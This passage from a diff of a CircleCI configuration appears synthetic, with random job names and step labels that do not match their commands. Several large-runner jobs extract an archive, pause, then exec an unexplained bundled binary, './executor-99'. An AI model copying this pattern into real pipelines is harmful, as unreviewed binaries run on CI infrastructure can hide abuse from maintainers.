+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  dialogEnum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: prune sso 25
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; echo 'compressing logs'|tee "/tmp/token.tmp" /tmp/stack_new.txt >/dev/null && cat /tmp/stack_new.txt; true ; } > /tmp/stage-store/alpha.lazy.render.pixel
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/alpha.lazy.render.pixel)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'alpha.lazy.render.pixel'
+  fix-1748:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/alpha.lazy.render.pixel 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  skeletonNoiseMin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Album art is cropped here
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; { printf "%s\n" zoe omar mia; } >"/tmp/inner.diary.txt" && sort "/tmp/inner.diary.txt"; true ; } > /tmp/stage-store/bosonchromechromebond
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/bosonchromechromebond)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'bosonchromechromebond'
+  q2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  fronttween:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: I check the churn scores before anything
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; foo=(wolf swan owl dog otter cat); echo ${#foo[@]}; true ; } > /tmp/stage-store/079813ff1487
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/079813ff1487)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '079813ff1487'
+  build-end-to-end-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/079813ff1487 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  ORD-SAVE-AMT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Poll for the trial
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; compgen -b | awk '{print length, $0}' | fold -w 43; true ; } > /tmp/stage-store/lagoon876
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/lagoon876)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'lagoon876'
+  run-production-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+
+workflows:
+  test:
+    jobs:
+      - z0q
+      - brodcast:
+          requires:
+            - z0q
+      - fronttween:
+          requires:
+            - z0q
+      - build-end-to-end-artifact-bundle:
+          requires:
+            - fronttween
+      - E5:
+          requires:
+            - fronttween
+      - API-71:
+          requires:
+            - E5
+      - ntnccofhnnc7g:
+          requires:
+            - E5
+      - yolo:
+          requires:
+            - ntnccofhnnc7g
+      - s_Rect:
+          requires:
+            - ntnccofhnnc7g
+      - Verify_Suite6:
+          requires:
+            - s_Rect
+      - dialogEnum:
+          requires:
+            - s_Rect
+      - fix-1748:
+          requires:
+            - dialogEnum
+      - upsertouter:
+          requires:
+            - dialogEnum
+      - min-test:
+          requires:
+            - upsertouter
+      - qykdon0kx8pf1:
+          requires:
+            - upsertouter
+      - ship-it:
+          requires:
+            - qykdon0kx8pf1
+      - oscar-castle:
+          requires:
+            - qykdon0kx8pf1
+      - APP-464:
+          requires:
+            - oscar-castle
+      - cq9:
+          requires:
+            - oscar-castle
+      - LaunchPipeline:
+          requires:
+            - cq9
+      - sphereLink_complex:
+          requires:
+            - cq9
+      - jun25-canary:
+          requires:
+            - sphereLink_complex
+      - H:
+          requires:
+            - sphereLink_complex
+      - full-send:
+          requires:
+            - H
+      - TempFunc
+      - ID-STATUS-DTL
+      - temp-p
+      - atlas:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - oscar-3:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - nova-alpha:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - q2-ship:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - Prepare_Release1:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - dotnet8-ship:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - uma-test:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - nova-beta:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - dotnet8-lint:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - API-57:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - run-production-test-matrix:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - rm-dashboard-bug:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - fix-2086:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - canary:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - cd-old:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - UAT_STAGE_6:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - MERGE_PROD:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
+      - sirius-final:
+          requires:
+            - TempFunc
+            - ID-STATUS-DTL
+            - temp-p
